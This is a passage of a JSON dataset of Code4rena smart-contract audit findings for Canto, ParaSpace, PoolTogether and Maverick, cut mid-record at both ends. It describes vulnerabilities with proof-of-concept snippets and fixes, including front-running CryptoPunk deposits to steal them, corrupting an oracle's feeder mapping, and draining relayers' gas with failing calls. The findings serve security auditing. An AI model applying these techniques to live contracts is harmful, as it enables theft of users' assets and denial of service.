([state_transition.go#L272-L278](https://github.com/evmos/ethermint/blob/37e394f309808d911b6c7d7eaf1e0c7a9cc1c70b/x/evm/keeper/state_transition.go#L272-L278)): ```go if err = k.PostTxProcessing(tmpCtx, msg, receipt); err != nil {   // If hooks return error, revert the whole tx.   res.VmError = types.ErrPostTxProcessing.Error()   k.Logger(ctx).Error(\"tx post processing failed\", \"error\", err) ```  One example of when the hook can revert in normal circumstances is when the fees to be distributed are 0, which can be caused by a combination of low gas usage of a transaction, a small CSR share, and rounding (the fees are a share of the gas spent to execute a transaction: [evm_hooks.go#L66-L70](https://github.com/code-423n4/2022-11-canto/blob/2733fdd1bee73a6871c6243f92a007a0b80e4c61/Canto/x/csr/keeper/evm_hooks.go#L66-L70)). In this case, the `distributeFees` call will revert and will cause the whole transaction to be reverted as well ([evm_hooks.go#L86-L89](https://github.com/code-423n4/2022-11-canto/blob/2733fdd1bee73a6871c6243f92a007a0b80e4c61/Canto/x/csr/keeper/evm_hooks.go#L86-L89), [Turnstile.sol#L149](https://github.com/code-423n4/2022-11-canto/blob/2733fdd1bee73a6871c6243f92a007a0b80e4c61/CIP-001/src/Turnstile.sol#L149)). ## Tools Used Manual review ## Recommended Mitigation Steps In the `PostTxProcessing` hook, consider always logging errors and returning `nil` to avoid impairing user transactions. Also, consider logging a fatal error and exiting when the module cannot function due to an error."}, {"title": "A registered contract won't earn fees if `_recipient` is a fresh address", "html_url": "https://github.com/code-423n4/2022-11-canto-findings/issues/93", "labels": ["bug", "3 (High Risk)", "primary issue", "selected for report", "sponsor confirmed", "H-02"], "target": "2022-11-canto-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-canto/blob/2733fdd1bee73a6871c6243f92a007a0b80e4c61/Canto/x/csr/keeper/event_handler.go#L31-L33   # Vulnerability details  ## Impact Users might fall victims of a false positive: if they use a fresh account as an NFT recipient during contract registration, the transaction won't revert, but the registered contract will never earn fees for the token holder. And since a contract can be registered only once, there won't be a way for affected users to re-register contracts and start earning fees. This can affect both big and smaller project that register their contracts with the Turnstile contract: the only condition for the bug to happen is that the recipient address that's used during registration is a fresh address (i.e. an address that hasn't been used yet). ## Proof of Concept The `register` function allows the calling contract to specify the address that will receive the freshly minted NFT ([Turnstile.sol#L86](https://github.com/code-423n4/2022-11-canto/blob/2733fdd1bee73a6871c6243f92a007a0b80e4c61/CIP-001/src/Turnstile.sol#L86)): ```solidity function register(address _recipient) public onlyUnregistered returns (uint256 tokenId) {     address smartContract = msg.sender;      if (_recipient == address(0)) revert InvalidRecipient();      tokenId = _tokenIdTracker.current();     _mint(_recipient, tokenId);     _tokenIdTracker.increment();      emit Register(smartContract, _recipient, tokenId);      feeRecipient[smartContract] = NftData({         tokenId: tokenId,         registered: true     }); } ```  A recipient address can be any address besides the zero address. However, on the consensus layer, there's a stricter requirement ([event_handler.go#L31-L33](https://github.com/code-423n4/2022-11-canto/blob/2733fdd1bee73a6871c6243f92a007a0b80e4c61/Canto/x/csr/keeper/event_handler.go#L31-L33)): a recipient address cannot be a *fresh account*, that is an address that: - hasn't ever received native coins; - hasn't ever sent a transaction; - hasn't ever had contract code.  While, on the application layer, calling the `register` function with a fresh address will succeed, on the consensus layer a contract won't be registered. When a `Register` event is processed on the consensus layer, there's a check that requires that the recipient address is an *existing account* in the state database ([event_handler.go#L31-L33](https://github.com/code-423n4/2022-11-canto/blob/2733fdd1bee73a6871c6243f92a007a0b80e4c61/Canto/x/csr/keeper/event_handler.go#L31-L33)): ```go // Check that the receiver account  exists in the evm store if acct := k.evmKeeper.GetAccount(ctx, event.Recipient); acct == nil {   return sdkerrors.Wrapf(ErrNonexistentAcct, \"EventHandler::RegisterEvent account does not exist: %s\", event.Recipient) } ```  If the recipient account doesn't exist, the function will return, but the register transaction won't revert (errors during the events processing doesn't result in a revert: [evm_hooks.go#L123-L132](https://github.com/code-423n4/2022-11-canto/blob/2733fdd1bee73a6871c6243f92a007a0b80e4c61/Canto/x/csr/keeper/evm_hooks.go#L123-L132), [evm_hooks.go#L49](https://github.com/code-423n4/2022-11-canto/blob/2733fdd1bee73a6871c6243f92a007a0b80e4c61/Canto/x/csr/keeper/evm_hooks.go#L49)).  The `GetAccount` function above returns `nil` when an address doesn't exist in the state database. To see this, we need to unwind the `GetAccount` execution: 1. the `GetAccount` is called on an `evmKeeper` ([event_handler.go#L31](https://github.com/code-423n4/2022-11-canto/blob/2733fdd1bee73a6871c6243f92a007a0b80e4c61/Canto/x/csr/keeper/event_handler.go#L31)):     ```go     if acct := k.evmKeeper.GetAccount(ctx, event.Recipient); acct == nil {       return sdkerrors.Wrapf(ErrNonexistentAcct, \"EventHandler::RegisterEvent account does not exist: %s\", event.Recipient)     }     ``` 1. `evmKeeper` is set during the CSR Keeper initialization ([keeper.go#L27](https://github.com/code-423n4/2022-11-canto/blob/2733fdd1bee73a6871c6243f92a007a0b80e4c61/Canto/x/csr/keeper/keeper.go#L27)):     ```go     func NewKeeper(       cdc codec.BinaryCodec,       storeKey sdk.StoreKey,       ps paramtypes.Subspace,       accountKeeper types.AccountKeeper,       evmKeeper types.EVMKeeper,       bankKeeper types.BankKeeper,       FeeCollectorName string,     ) Keeper {       // set KeyTable if it has not already been set       if !ps.HasKeyTable() {         ps = ps.WithKeyTable(types.ParamKeyTable())       }        return Keeper{         storeKey:         storeKey,         cdc:              cdc,         paramstore:       ps,         accountKeeper:    accountKeeper,         evmKeeper:        evmKeeper,         bankKeeper:       bankKeeper,         FeeCollectorName: FeeCollectorName,       }     }     ``` 1. the CSR Keeper is initialized during the main app initialization ([app.go#L473-L478](https://github.com/code-423n4/2022-11-canto/blob/2733fdd1bee73a6871c6243f92a007a0b80e4c61/Canto/app/app.go#L473-L478)), this is also when the EVM Keeper is initialized ([app.go#L409-L413](https://github.com/code-423n4/2022-11-canto/blob/2733fdd1bee73a6871c6243f92a007a0b80e4c61/Canto/app/app.go#L409-L413)):     ```go     app.EvmKeeper = evmkeeper.NewKeeper(       appCodec, keys[evmtypes.StoreKey], tkeys[evmtypes.TransientKey], app.GetSubspace(evmtypes.ModuleName),       app.AccountKeeper, app.BankKeeper, &stakingKeeper, app.FeeMarketKeeper,       tracer,     )     ``` 1. the EVM Keeper is implemented and imported from Ethermint ([keeper.go#L67](https://github.com/evmos/ethermint/blob/f7f1e1c18c64c912e7b5d524ae710e542b47e02a/x/evm/keeper/keeper.go#L67)); 1. here's the `GetAccount` function ([statedb.go#L25](https://github.com/evmos/ethermint/blob/f7f1e1c18c64c912e7b5d524ae710e542b47e02a/x/evm/keeper/statedb.go#L25)):     ```go     func (k *Keeper) GetAccount(ctx sdk.Context, addr common.Address) *statedb.Account {       acct := k.GetAccountWithoutBalance(ctx, addr)       if acct == nil {         return nil       }        acct.Balance = k.GetBalance(ctx, addr)       return acct     }     ``` 1. the `GetAccountWithoutBalance` function calls `GetAccount` on `accountKeeper` ([keeper.go#L255-L258](https://github.com/evmos/ethermint/blob/f7f1e1c18c64c912e7b5d524ae710e542b47e02a/x/evm/keeper/keeper.go#L255-L258)):     ```go     acct := k.accountKeeper.GetAccount(ctx, cosmosAddr)     if acct == nil {       return nil     }     ``` 1. The Account Keeper is implemented in the Cosmos SDK ([account.go#L41-L49](https://github.com/cosmos/cosmos-sdk/blob/394f1b9478a8dc568d4bab079732932488b46704/x/auth/keeper/account.go#L41-L49)):     ```go     func (ak AccountKeeper) GetAccount(ctx sdk.Context, addr sdk.AccAddress) types.AccountI {       store := ctx.KVStore(ak.storeKey)       bz := store.Get(types.AddressStoreKey(addr))       if bz == nil {         return nil       }        return ak.decodeAccount(bz)     }     ``` 1. it basically reads an account from the store passed in the context object ([context.go#L280-L282](https://github.com/cosmos/cosmos-sdk/blob/394f1b9478a8dc568d4bab079732932488b46704/types/context.go#L280-L282)); 1. in the Account Keeper, there's also `SetAccount` function ([account.go#L72](https://github.com/cosmos/cosmos-sdk/blob/394f1b9478a8dc568d4bab079732932488b46704/x/auth/keeper/account.go#L72)), and it's called in Ethermint by the EVM Keeper ([statedb.go#L126](https://github.com/evmos/ethermint/blob/f7f1e1c18c64c912e7b5d524ae710e542b47e02a/x/evm/keeper/statedb.go#L126)); 1. the EVM Keeper's `SetAccount` is called when transaction changes are committed to the state database ([statedb.go#L449](https://github.com/evmos/ethermint/blob/f7f1e1c18c64c912e7b5d524ae710e542b47e02a/x/evm/statedb/statedb.go#L449)); 1. the state database is a set of state objects, where keys are account addresses and values are accounts themselves; 1. the `getOrNewStateObject` function initializes new state objects ([statedb.go#L221-L227](https://github.com/evmos/ethermint/blob/f7f1e1c18c64c912e7b5d524ae710e542b47e02a/x/evm/statedb/statedb.go#L221-L227)); 1. `getOrNewStateObject` is only called by these functions: `AddBalance`, `SubBalance`, `SetNonce`, `SetCode`, `SetState` ([statedb.go#L290-L328](https://github.com/evmos/ethermint/blob/f7f1e1c18c64c912e7b5d524ae710e542b47e02a/x/evm/statedb/statedb.go#L290-L328)).  Thus, a new account object in the state database is only created when an address receives native coins, sends a transaction (which increases the nonce), or when contract code is deployed at it.  ### Example Exploit Scenario 1. Alice deploys a smart contract that attracts a lot of users. 1. Alice registers the contract in Turnstile. As a recipient contract for the NFT, Alice decides to use a dedicated address that hasn't been used for anything else before (hasn't received coins, hasn't sent a transaction, etc.). 1. The `register` function call succeeds and the Alice's contract gets registered in Turnstile. 1. However, due to the \"only existing recipient account\" check on the consensus layer, Alice's contract wasn't registered on the consensus layer and doesn't earn fees. 1. Since `register` and `assign` can only be called once (due to the `onlyUnregistered` modifier), Alice cannot re-register her contract. She can transfer the NFT to a different address, however this won't make the contract registered on the consensus layer and the owner of the NFT will never receive fees. ## Tools Used Manual review ## Recommended Mitigation Steps Consider removing the \"only existing recipient account\" check in the `RegisterEvent` handler since it creates a discrepancy between the application and the consensus layers. Otherwise, if it's mandatory that receiver addresses are not fresh, consider returning an error in the `PostTxProcessing` hook (which will revert a transaction) if there was an error during events processing."}, {"title": "evm_hooks ignores some important errors", "html_url": "https://github.com/code-423n4/2022-11-canto-findings/issues/55", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-01"], "target": "2022-11-canto-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-canto/blob/2733fdd1bee73a6871c6243f92a007a0b80e4c61/Canto/x/csr/keeper/evm_hooks.go#L49 https://github.com/code-423n4/2022-11-canto/blob/2733fdd1bee73a6871c6243f92a007a0b80e4c61/Canto/x/csr/keeper/evm_hooks.go#L101-L135   # Vulnerability details  ## Impact Some contracts and some Turnstile tokens (nfts) wll not be able to receive CSR fees forever.   ## Proof of Concept In evm_hooks.go, the [PostTxProcessing](https://github.com/code-423n4/2022-11-canto/blob/2733fdd1bee73a6871c6243f92a007a0b80e4c61/Canto/x/csr/keeper/evm_hooks.go#L49) will call `h.processEvents(ctx, receipt)` to handle `Register` and `Assign` events from Turnstile contract first:   ```   h.processEvents(ctx, receipt)   ``` Notice that the `processEvents` function does not return any error.  However, it is possible for [processEvents](https://github.com/code-423n4/2022-11-canto/blob/2733fdd1bee73a6871c6243f92a007a0b80e4c61/Canto/x/csr/keeper/evm_hooks.go#L101-L135) to encounter an error:    ```   func (h Hooks) processEvents(ctx sdk.Context, receipt *ethtypes.Receipt) {     ...     for _, log := range receipt.Logs {       ...       if log.Address == turnstileAddress {         ...         switch event.Name {         case types.TurnstileEventRegister:           err = h.k.RegisterEvent(ctx, log.Data)         case types.TurnstileEventUpdate:           err = h.k.UpdateEvent(ctx, log.Data)         }         if err != nil {           h.k.Logger(ctx).Error(err.Error())           return         }       }     }   }   ```  According to the above implementation of `processEvents`, it will process all the events emitted by the transaction one by one. If one of them encounters an error, it will return directly without any error, and any subsequent unprocessed events will be ignored.  Suppose we have a transaction contains the following events(by contract calls): 1. Register C1 with token1 2. Register C2 with token2 3. Assign C3 with token1  If `RegisterEvent()` returns an error when handling the first event, then all of the events will not be handled because `processEvents()` will return after logging the error. And `PostTxProcessing()` continues to execute normally because it is unaware of the error.  According to the current implementation of [`RegisterEvent()`](https://github.com/code-423n4/2022-11-canto/blob/main/Canto/x/csr/keeper/event_handler.go#L16) and [`UpdateEvent`](https://github.com/code-423n4/2022-11-canto/blob/main/Canto/x/csr/keeper/event_handler.go#L62), they are both easy to encounter an error. Like `register()` using a recipient that doesn't exist yet.  As a result, none of the C1, C2, C3 contracts will be able to recieve any CSR fee because they are not recorded in csr store.  Contrcts C1, C2, C3 will never be able to register for CSR because they are marked registered in Turnstile contract (evm store) and will be reverted by `onlyUnregistered` when calling `register()` or `assign()`.  And all other contracts calling `assign(token1)` or `assign(token2)` will enter the same state as C1/C2/C3, because the `assign()` will succeed in Turnstile contract but fail in [`UpdateEvent()`](https://github.com/code-423n4/2022-11-canto/blob/2733fdd1be/Canto/x/csr/keeper/event_handler.go#L75-L80) (because the store can not find token1 or token2):    ```  // Check if the NFT that is being updated exists in the CSR store  nftID := event.TokenId.Uint64()  csr, found := k.GetCSR(ctx, nftID)  if !found {   return sdkerrors.Wrapf(ErrNFTNotFound, \"EventHandler::UpdateEvent the nft entered does not currently exist: %d\", nftID)  }   ```  ## Tools Used VS Code  ## Recommended Mitigation Steps  `processEvents()` should return the error it encounters, and `PostTxProcessing()` should return that error too. "}, {"title": "Anyone can steal CryptoPunk during the deposit flow to WPunkGateway", "html_url": "https://github.com/code-423n4/2022-11-paraspace-findings/issues/137", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "H-02"], "target": "2022-11-paraspace-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/ui/WPunkGateway.sol#L77-L95 https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/ui/WPunkGateway.sol#L129-L155 https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/ui/WPunkGateway.sol#L167-L193   # Vulnerability details  ## Impact  All CryptoPunk deposits can be stolen  ## Proof of Concept  CryptoPunks were created before the ERC721 standard. A consequence of this is that they do not possess the `transferFrom` method. To approximate this a user can `offerPunkForSaleToAddress` for a price of 0 to effectively approve the contract to `transferFrom`.    [WPunkGateway.sol#L77-L95](https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/ui/WPunkGateway.sol#L77-L95)      function supplyPunk(         DataTypes.ERC721SupplyParams[] calldata punkIndexes,         address onBehalfOf,         uint16 referralCode     ) external nonReentrant {         for (uint256 i = 0; i < punkIndexes.length; i++) {             Punk.buyPunk(punkIndexes[i].tokenId);             Punk.transferPunk(proxy, punkIndexes[i].tokenId);             // gatewayProxy is the sender of this function, not the original gateway             WPunk.mint(punkIndexes[i].tokenId);         }         Pool.supplyERC721(             address(WPunk),             punkIndexes,             onBehalfOf,             referralCode         );     }  The current implementation of `WPunkGateway#supplyPunk` allows anyone to execute and determine where the nTokens are minted to. To complete the flow supply flow a user would need to `offerPunkForSaleToAddress` for a price of 0 to `WPunkGateway`. After they have done this, anyone can call the function to deposit the punk and mint the nTokens to themselves, effectively stealing it.  Example: `User A` owns `tokenID` of 1. They want to deposit it so they call `offerPunkForSaleToAddress` with an amount of 0, effectively approving the `WPunkGateway` to transfer their CryptoPunk. `User B` monitors the transactions and immediately calls `supplyPunk` with themselves as `onBehalfOf`. This completes the transfer of the CryptoPunk and deposits it into the pool but mints the `nTokens` to `User B`, allowing them to effectively steal the CryptoPunk   The same fundamental issue exists with `acceptBidWithCredit` and `batchAcceptBidWithCredit`  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Query the punkIndexToAddress to find the owner and only allow owner to deposit:          for (uint256 i = 0; i < punkIndexes.length; i++) {     +       address owner = Punk.punkIndexToAddress(punkIndexes[i].tokenId);     +       require(owner == msg.sender);              Punk.buyPunk(punkIndexes[i].tokenId);             Punk.transferPunk(proxy, punkIndexes[i].tokenId);             // gatewayProxy is the sender of this function, not the original gateway             WPunk.mint(punkIndexes[i].tokenId);         }"}, {"title": "Data corruption in NFTFloorOracle; Denial of Service", "html_url": "https://github.com/code-423n4/2022-11-paraspace-findings/issues/79", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-01"], "target": "2022-11-paraspace-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-paraspace/blob/main/paraspace-core/contracts/misc/NFTFloorOracle.sol#L335   # Vulnerability details  ## Impact During `_removeFeeder` operation in `NFTFloorOracle` contract, the feeder is removed from `feeders` array, and linking in `feederPositionMap` for the specific feeder is removed. Deletion logic is implemented in \"Swap + Pop\" way, so indexes changes, but existing **code doesn't update indexes in** `feederPositionMap` **after feeder removal**, which causes the issue of Denial of Service for further removals. As a result: - Impossible to remove some `feeders` from the contract due to Out of Bounds array access. Removal fails because of transaction revert. - Data in `feederPositionMap` is corrupted after some `feeders` removal. Data linking from `feederPositionMap.index` to `feeders` array is broken.   ## Proof of Concept ```     address internal feederA = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;     address internal feederB = 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2;     address internal feederC = 0x4B20993Bc481177ec7E8f571ceCaE8A9e22C02db;      function corruptFeedersMapping() external {         console.log(\"Starting from empty feeders array. Array size: %s\", feeders.length);         address[] memory initialFeeders = new address[](3);         initialFeeders[0] = feederA;         initialFeeders[1] = feederB;         initialFeeders[2] = feederC;         this.addFeeders(initialFeeders);         console.log(\"Feeders array: [%s, %s, %s]\", initialFeeders[0], initialFeeders[1], initialFeeders[2]);         console.log(\"Remove feeder B\");         this.removeFeeder(feederB);         console.log(\"feederPositionMap[A] = %s, feederPositionMap[C] = %s\", feederPositionMap[feederA].index, feederPositionMap[feederC].index);         console.log(\"Mapping for Feeder C store index 2, which was not updated after removal of B. Feeders array length is : %s\", feeders.length);         console.log(\"Try remove Feeder C. Transaction will be reverted because of access out of bounds of array. Data is corrupted\");         this.removeFeeder(feederC);     } ``` Snippet execution result: ![Alt text](https://i.gyazo.com/90ac873cd71194527d4d3b9bfe6e317e.png \"Optional title\")  ## Tools Used Visual inspection; Solidity snippet for PoC  ## Recommended Mitigation Steps Update index in `feederPositionMap` after feeders swap and pop. ``` feeders[feederIndex] = feeders[feeders.length - 1]; feederPositionMap[feeders[feederIndex]].index = feederIndex; //Index update added as a recommendation feeders.pop(); ```"}, {"title": "`CrossChainExecutor` contracts do not update the necessary states for failing transactions.", "html_url": "https://github.com/code-423n4/2022-12-pooltogether-findings/issues/166", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "downgraded by judge", "primary issue", "selected for report", "sponsor confirmed", "M-03"], "target": "2022-12-pooltogether-findings", "body": "# Lines of code  https://github.com/pooltogether/ERC5164/blob/5647bd84f2a6d1a37f41394874d567e45a97bf48/src/ethereum-optimism/EthereumToOptimismExecutor.sol#L45-L59 https://github.com/pooltogether/ERC5164/blob/5647bd84f2a6d1a37f41394874d567e45a97bf48/src/ethereum-arbitrum/EthereumToArbitrumExecutor.sol#L31-L45   # Vulnerability details  ## Impact The `CrossChainExecutorArbitrum` and `CrossChainExecutorOptimism` contracts both use `CallLib` library to invoke `Call`s on external contract. As per the `CallLib` library implementation, any failing `Call` results in the entire transaction getting reverted.  The `CrossChainExecutor` contracts does not store whether the calls in `CallLib.Call[]` were already attempted which failed.   This creates several issues for `CrossChainExecutor` contracts.   1. Offchain components can be tricked to submit failing `Call[]`s again and again. This can be used to drain the offchain component of gas.    2. Once a failing `Call[]` was invoked (which failed) and if again the same `Call[]` is invoked, the transaction should revert with `CallsAlreadyExecuted` error but it reverts with `CallFailure` error.  3. It is difficult to determine whether a to-be executed `Call[]` is pending or the invocation was already tried but failed.   PoCs for the above issues are listed below.   ## Proof of Concept  #### Scenario 1 ```solidity contract Foo {     function bar() public {         for(uint256 i; ; i++) {}     } } ```  - The attacker relays the `Foo.bar()` call in the `CrossChainRelayer` contract with `maxGasLimit` as the `_gasLimit` parameter.  - The transport layer tries to invoke the `Foo.bar()` call by calling the `CrossChainExecutor.executeCalls()`. This transaction reverts costing the transport layer client `maxGasLimit` gas.  - Since no state updates were performed in `CrossChainExecutor`, the transport layer still assumes the relayed call as pending which needs to be executed. The transport layer client again tries to execute the pending relayed call which reverts again. - Repeated execution of the above steps can deplete the gas reserves of transport layer client.  #### Scenario 2 ```solidity contract Foo {     function bar() public {         revert();     } } ```  - The attacker relays the `Foo.bar()` call in the `CrossChainRelayer` contract.  - The transport layer tries to invoke the `Foo.bar()` call by calling the `CrossChainExecutor.executeCalls()`. This transaction gets reverted.  - Since the relayed calls still seems as pending, the transport layer tries to invoke the `Foo.bar()` call again. This call should get reverted with `CallsAlreadyExecuted` error but it gets reverted with `CallFailure` error.  ## Tools Used Manual review  ## Recommended Mitigation Steps The `CrossChainExecutor` contract should store whether a relayed call was attempted to be executed to make sure the execution cannot be tried again.  The `CallLib` library can be changed to not completely revert the transaction when any individual `Call` gets failed. "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-12-pooltogether-findings/issues/140", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "selected for report", "sponsor confirmed", "Q-03"], "target": "2022-12-pooltogether-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-pooltogether-findings/blob/main/data/0xSmartContract-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-12-pooltogether-findings/issues/102", "labels": ["bug", "G (Gas Optimization)", "grade-b", "sponsor confirmed", "edited-by-warden", "G-03"], "target": "2022-12-pooltogether-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-pooltogether-findings/blob/main/data/Rolezn-G.md)."}, {"title": "When a smart contract calls CrossChainRelayerArbitrum.processCalls, excess submission fees may be lost", "html_url": "https://github.com/code-423n4/2022-12-pooltogether-findings/issues/63", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-02"], "target": "2022-12-pooltogether-findings", "body": "# Lines of code  https://github.com/pooltogether/ERC5164/blob/5647bd84f2a6d1a37f41394874d567e45a97bf48/src/ethereum-arbitrum/EthereumToArbitrumRelayer.sol#L118-L127   # Vulnerability details  ## Impact When the user calls CrossChainRelayerArbitrum.processCalls, ETH is sent as the submission fee.  According to the documentation : https://github.com/OffchainLabs/arbitrum/blob/master/docs/L1_L2_Messages.md#retryable-transaction-lifecycle ``` Credit-Back Address: Address to which all excess gas is credited on L2; i.e., excess ETH for base submission cost (MaxSubmissionCost - ActualSubmissionCostPaid) and excess ETH provided for L2 execution ( (GasPrice x MaxGas) - ActualETHSpentInExecution). ... Submission fee is collected: submission fee is deducted from the sender\u2019s L2 account; MaxSubmissionCost - submission fee is credited to Credit-Back Address. ``` the excess submission fee is refunded to the address on L2 of the excessFeeRefundAddress provided when calling createRetryableTicket.  ```solidity      * @notice Put a message in the L2 inbox that can be reexecuted for some fixed amount of time if it reverts      * @dev all msg.value will deposited to callValueRefundAddress on L2      * @param destAddr destination L2 contract address      * @param l2CallValue call value for retryable L2 message      * @param  maxSubmissionCost Max gas deducted from user's L2 balance to cover base submission fee      * @param excessFeeRefundAddress maxgas x gasprice - execution cost gets credited here on L2 balance      * @param callValueRefundAddress l2Callvalue gets credited here on L2 if retryable txn times out or gets cancelled      * @param maxGas Max gas deducted from user's L2 balance to cover L2 execution      * @param gasPriceBid price bid for L2 execution      * @param data ABI encoded data of L2 message      * @return unique id for retryable transaction (keccak256(requestID, uint(0) )      */     function createRetryableTicket(         address destAddr,         uint256 l2CallValue,         uint256 maxSubmissionCost,         address excessFeeRefundAddress,         address callValueRefundAddress,         uint256 maxGas,         uint256 gasPriceBid,         bytes calldata data     ) external payable virtual override onlyWhitelisted returns (uint256) { ``` In CrossChainRelayerArbitrum.processCalls, excessFeeRefundAddress == msg.sender. ```solidity     uint256 _ticketID = inbox.createRetryableTicket{ value: msg.value }(       address(executor),       0,       _maxSubmissionCost,       msg.sender,   // @audit : excessFeeRefundAddress       msg.sender,  // @audit: callValueRefundAddress       _gasLimit,       _gasPriceBid,       _data     ); ``` For EOA accounts, the excess submission fees are correctly refunded to their address on L2. However, for smart contracts, since there may not exist a corresponding address on L2, these excess submission fees will be lost.  Also, since the callValueRefundAddress is also msg.sender, according to the documentation, if the Retryable Ticket is cancelled or expired, then the smart contract caller may lose all the submission fees ``` If the Retryable Ticket is cancelled or expires before it is redeemed, Callvalue is credited to Beneficiary.  ```  ## Proof of Concept https://github.com/pooltogether/ERC5164/blob/5647bd84f2a6d1a37f41394874d567e45a97bf48/src/ethereum-arbitrum/EthereumToArbitrumRelayer.sol#L118-L127 https://github.com/OffchainLabs/arbitrum/blob/master/packages/arb-bridge-eth/contracts/bridge/Inbox.sol#L333-L354 ## Tools Used None ## Recommended Mitigation Steps Consider allowing the user to specify excessFeeRefundAddress and callValueRefundAddress when calling CrossChainRelayerArbitrum.processCalls "}, {"title": "An attacker can make users unable to cancel their L1 calls on Ethereum To Arbitrum", "html_url": "https://github.com/code-423n4/2022-12-pooltogether-findings/issues/60", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "edited-by-warden", "M-01"], "target": "2022-12-pooltogether-findings", "body": "# Lines of code  https://github.com/pooltogether/ERC5164/blob/5647bd84f2a6d1a37f41394874d567e45a97bf48/src/ethereum-arbitrum/EthereumToArbitrumRelayer.sol#L118-#L127   # Vulnerability details  ## Impact An attacker can make users unable to cancel their L1 calls on Ethereum To Arbitrum.  ## Proof of Concept When someone want to make  calls to Arbitrum from Ethereum, first they call `relayCalls` to fingerprint their data and then anyone else can call `processCalls` to process the calls. According to the doc in Inbox source code https://github.com/OffchainLabs/nitro/blob/1f32bec6b9b228bb2fab4bfa02867716f65d0c5c/contracts/src/bridge/Inbox.sol#L427, function `createRetryableTicket` has one parameter called `callValueRefundAddress` and this is the address that is granted the option to `cancel` a `Retryable`. In `EthereumToArbitrumRelayer.sol` it's currently set as `msg.sender` (5th parameter) which is whoever make the call to  function `processCall`:  ``` uint256 _ticketID = inbox.createRetryableTicket{ value: msg.value }(       address(executor),       0,       _maxSubmissionCost,       msg.sender,       msg.sender,       _gasLimit,       _gasPriceBid,       _data     ); ``` This implementation allows an attacker to remove the possibility of a user to cancel their calls, which is an important mechanism to be properly implemented. This scenario demonstrates how this could happen: - User A call `relayCalls` to fingerprint their calls - User B call `processCalls` to process user A's calls. - User A now changes his mind and wants to cancel his calls but he's unable to since  `callValueRefundAddress` is set to user B's address, now user B is the one who decides whether to cancel user A's calls or not, which should be user A's option. - Another common case is when users's calls failed, anyone can try to `redeem` it, according to the doc https://developer.arbitrum.io/arbos/l1-to-l2-messaging. So if a someone calls `processCalls` to process others's calls and it fails, the owner of the calls now cannot cancel their calls and anyone else can redeem (reexecute) them.  It should be noted here that `EthereumToArbitrumRelayer.sol` provides no other functionality to cancel users's calls, but it seems to rely only on Arbitrum's Retryable cancel mechanism to do so.   ## Tools Used Manual review.  ## Recommended Mitigation Steps Currently, anyone can process others's calls by calling `processCalls` functions and I think this does not pose any security risk as long as the user who actually fingerprinted these calls can reserve their rights to cancel it if they want to. Therefore, I recommend changing `callValueRefundAddress` in `createRetryableTicket` to `_sender`, this combines with event `ProcessedCalls(_nonce, msg.sender, _ticketID)` emitted at the end of `processCalls` function will allow a user to be notified if their calls has been processed by anyone else and they can cancel it in L2 using `_ticketID`. "}, {"title": "TWA update is not correct", "html_url": "https://github.com/code-423n4/2022-12-Stealth-Project-findings/issues/105", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "M-07"], "target": "2022-12-Stealth-Project-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-Stealth-Project/blob/fc8589d7d8c1d8488fd97ccc46e1ff11c8426ac2/maverick-v1/contracts/models/Pool.sol#L294   # Vulnerability details  ## Impact  Time-warped-price is updated incorrectly and this affects moving bins.  ## Proof of Concept  The protocol updates `twa` on every swap and uses that to decide how to move bins. But in the function `swap()`, the delta's `endSqrtPrice` can not contribute negatively to the `activeTick` because it is wrapped with a `clip()` function.  ```solidity // Pool.sol 286:         if (amountOut != 0) { 287:             if (tokenAIn) { 288:                 binBalanceA += delta.deltaInBinInternal.toUint128(); 289:                 binBalanceB = Math.clip128(binBalanceB, delta.deltaOutErc.toUint128()); 290:             } else { 291:                 binBalanceB += delta.deltaInBinInternal.toUint128(); 292:                 binBalanceA = Math.clip128(binBalanceA, delta.deltaOutErc.toUint128()); 293:             } 294:             twa.updateValue(currentState.activeTick * PRBMathSD59x18.SCALE + int256(Math.clip(delta.endSqrtPrice, delta.sqrtLowerTickPrice).div(delta.sqrtUpperTickPrice - delta.sqrtLowerTickPrice)));//@audit second part of the sum is always positive, should contribute both ways 295:         } 296: ```  I believe `delta.endSqrtPrice` should contribute both ways to the `activeTick` and it is quite possible for the `endSqrtPrice` to be out of the range `(delta.sqrtLowerTickPrice, delta.sqrtUpperTickPrice)`. (In another report, I mentioned an issue of accuracy loss in the calculation of `endSqrtPrice`).  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  I recommend changing the relevant line as below without using `clip()` so that the `endSqrtPrice` can contribute to the `twa` reasonably.  ```solidity 294:             twa.updateValue(currentState.activeTick * PRBMathSD59x18.SCALE + int256((delta.endSqrtPrice, delta.sqrtLowerTickPrice).div(delta.sqrtUpperTickPrice - delta.sqrtLowerTickPrice))); ```"}, {"title": "Ownership of EscherERC721.sol contracts can be changed, thus creator roles become useless ", "html_url": "https://github.com/code-423n4/2022-12-escher-findings/issues/521", "labels": ["bug", "2 (Med Risk)", 